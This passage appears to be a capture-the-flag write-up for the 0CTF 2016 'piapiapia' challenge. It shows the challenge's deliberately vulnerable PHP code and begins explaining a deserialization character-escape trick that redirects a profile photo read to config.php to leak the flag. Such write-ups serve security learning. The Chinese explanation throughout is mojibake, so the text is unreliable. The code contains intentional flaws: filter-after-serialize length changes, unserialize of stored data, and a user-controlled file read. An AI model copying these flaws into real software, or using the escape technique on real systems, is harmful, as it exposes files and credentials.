string">'/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token markup">&lt; 5 or $file['size'] ></span> <span class="token number">1000000</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Update Profile Success!&lt;a href="profile.php">Your Profile&lt;/a>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter">?></span></code></pre><p><strong>class.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">user</span> <span class="token keyword">extends</span> <span class="token class-name">mysql</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'users'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$object</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$object</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$object</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">profile</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> __class__<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">mysql</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>             <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"SET sql_mode='strict_all_tables'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">,</span> <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT $ret FROM $table WHERE $where"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">mysql_fetch_object</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">'\''</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'\',\''</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'\''</span><span class="token punctuation">;</span>         <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO $table ($key) VALUES ($value)"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE $table SET $key = '$value' WHERE $where"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">;</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'insert'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> __class__<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>profile.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>index.php&amp;register.php</strong></p><p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210711231343553.png" alt="image-20210711231343553"></p><p> <strong>$profile[â€˜photoâ€™]çš„å€¼ä¸ºâ€œconfig.phpâ€</strong>å°±å¯ä»¥å¾—åˆ°flag.php</p><h3 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çŸ¥è¯†è¡¥å……"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çŸ¥è¯†è¡¥å……" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çŸ¥è¯†è¡¥å……"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çŸ¥è¯†è¡¥å……</h3><ul><li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸<br> ä¸¾ä¸ªå°ä¾‹å­<br> åºåˆ—åŒ–</li></ul><pre><code>&lt;?php$a = array('123', 'abc', 'defg');var_dump(serialize($a));?&gt;</code></pre><p>ç»“æžœ</p><pre><code>string(49) "a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}" </code></pre><p>ååºåˆ—åŒ–</p><pre><code>&lt;?php//$a = array('123', 'abc', 'defg');//var_dump(serialize($a));//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}';var_dump(unserialize($b));?&gt;</code></pre><p>è¿è¡Œç»“æžœ</p><pre><code>array(3) { [0]=&gt; string(3) "123" [1]=&gt; string(3) "abc" [2]=&gt; string(4) "defg" } </code></pre><p>â€ƒâ€ƒæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨åŽç«¯ä¸­ï¼Œååºåˆ—åŒ–æ˜¯ä¸€â€;}ç»“æŸçš„ï¼Œå¦‚æžœæˆ‘ä»¬æŠŠâ€;}å¸¦å…¥éœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼ˆé™¤äº†ç»“å°¾å¤„ï¼‰ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½è®©ååºåˆ—åŒ–æå‰ç»“æŸåŽé¢çš„å†…å®¹å°±ä¸¢å¼ƒäº†å‘¢ï¼Ÿ<br> â€ƒæˆ‘ä»¬æŠŠç¬¬äºŒä¸ªå€¼abcæ¢æˆabcâ€;i:2;s:5:â€qwertâ€;}</p><pre><code>&lt;?php//$a = array('123', 'abc', 'defg');//var_dump(serialize($a));//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";}";i:2;s:4:"defg";}';var_dump(unserialize($b));?&gt;</code></pre><p>è¿è¡Œç»“æžœ</p><pre><code>array(3) { [0]=&gt; string(3) "123" [1]=&gt; string(3) "abc" [2]=&gt; string(5) "qwert" } </code></pre><p>æˆåŠŸçš„ååºåˆ—åŒ–å‡ºæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„å†…å®¹ï¼Œä¸¢å¼ƒäº†åŽŸå…ˆçš„å†…å®¹ï¼ˆi:2;s:4:â€defgâ€ï¼‰<br> ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸å°±å…ˆä»‹ç»åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å›žè¿‡å¤´æ¥çœ‹ä¸€ä¸‹é¢˜</p><ul><li>çªç ´å£<br> æˆ‘ä»¬å‘çŽ°ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œé¦–å…ˆåºåˆ—åŒ–çš„å­—ç¬¦æ˜¯å¯æŽ§çš„ï¼Œè¿˜æœ‰å‰é¢çš„é•¿åº¦æ˜¯å¯æŽ§çš„ã€‚ä½†update.phpå°†å‚æ•°åºåˆ—åŒ–ï¼Œæˆ‘ä»¬å¯æŽ§å˜é‡çš„é•¿åº¦å°±å·²ç»å†™æ­»äº†ï¼Œæ€Žä¹ˆæ‰èƒ½åŽ»æŽ§åˆ¶å‘¢ã€‚è¿™é“é¢˜çš„çªç ´å£å…¶å®žå°±æ˜¯åºåˆ—åŒ–è¿‡åŽæ•°æ®è¿‡æ»¤æ›¿æ¢é‚£é‡Œï¼Œçœ‹ä¼¼æ›´åŠ å®‰å…¨ï¼Œå…¶å®žæ›´åŠ å±é™©ã€‚</li></ul><pre><code>//è¿‡æ»¤å‡½æ•°    public function filter($string) {        $escape = array('\'', '\\\\');        $escape = '/' . implode('|', $escape) . '/';        $string = preg_replace($escape, '_', $string);        $safe = array('select', 'insert', 'update', 'delete', 'where');        $safe = '/' . implode('|', $safe) . '/i';        return preg_replace($safe, 'hacker', $string);    }</code></pre><p>â€ƒâ€ƒè¿™é‡Œæ˜¯å°†â€™selectâ€™, â€˜insertâ€™, â€˜updateâ€™, â€˜deleteâ€™,  â€˜whereâ€™æ›¿æ¢æˆâ€™hackerâ€™ï¼Œæˆ‘ä»¬å†™å…¥whereæ›¿æ¢æˆhackerä¹‹åŽå­—ç¬¦ä¸²å®žé™…çš„é•¿åº¦å°±+1ï¼Œå› æ­¤å®žé™…çš„é•¿åº¦å¤§äºŽåºåˆ—åŒ–å›ºå®šçš„é•¿åº¦ï¼ˆå˜é‡å‰é¢â€˜sâ€™é‡Œçš„å€¼ï¼‰ã€‚åˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œååºåˆ—åŒ–æ—¶åªèƒ½å°†å­—ç¬¦ä¸²ä¸­nicknameå‰é¢çš„såŽé¢é•¿åº¦çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–æˆåŠŸï¼Œè¿™ä¸ªæ˜¯ä¼ å‚çš„æ—¶å€™å°±å›ºå®šå¥½äº†ã€‚å‰©ä¸‹çš„å­—ç¬¦ä¸²æˆ‘ä»¬æž„é€ æˆclass.phpå› ä¸ºé‡Œé¢åŒ…å«äº†flagï¼Œå¹¶ä¸”è®©ä»–åœ¨photoä½ç½®ä¸Šï¼Œç„¶åŽæŠŠphotoç»™æ‰”æŽ‰ï¼Œè¿™æ ·åœ¨profile.phpä¸­è¯»å–çš„photoå°±æ˜¯æˆ‘ä»¬æž„é€ çš„config.phpäº†ï¼Œä¹Ÿå°±æ˜¯è¯»å–åˆ°äº†flag<br> â€ƒç®€å•è¯´å°±æ˜¯åˆ©ç”¨åŽç«¯çš„å‡½æ•°æ›¿æ¢ï¼Œå¯¼è‡´å®žé™…é•¿åº¦å¢žåŠ ï¼Œå¢žåŠ çš„éƒ¨åˆ†ï¼ˆconfig.phpï¼‰è¢«æŒ¤äº†å‡ºæ¥ï¼Œåˆ°äº†photoçš„ä½ç½®ä¸Šï¼Œç„¶åŽé—­åˆã€‚<br> â€ƒå†ä¸¾ä¸ªä¾‹æ–¹ä¾¿å¤§å®¶ç†è§£</p><pre><code>&lt;?php//$a = array('123', 'abc', 'defg');//var_dump(serialize($a));//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"$a = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}';$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";}";i:2;s:4:"defg";}';var_dump(unserialize($b));var_dump(unserialize($b));?&gt;</code></pre><p>abcå‰é¢çš„s:3:ä¸å˜ï¼Œå› ä¸ºæ˜¯åºåˆ—åŒ–çš„æ—¶å€™å›ºå®šäº†<br> æˆ‘ä»¬å°†abcæž„é€ æˆï¼šabcâ€;i:2;s:5:â€qwertâ€;}æˆ‘ä»¬å†æœ€åŽæž„é€ äº†ä¸€ä¸ªé—­åˆï¼Œå¯¼è‡´defgè¢«ä¸¢å¼ƒï¼Œqwertå ç”¨äº†defgåŽŸæœ¬çš„ä½ç½®<br> 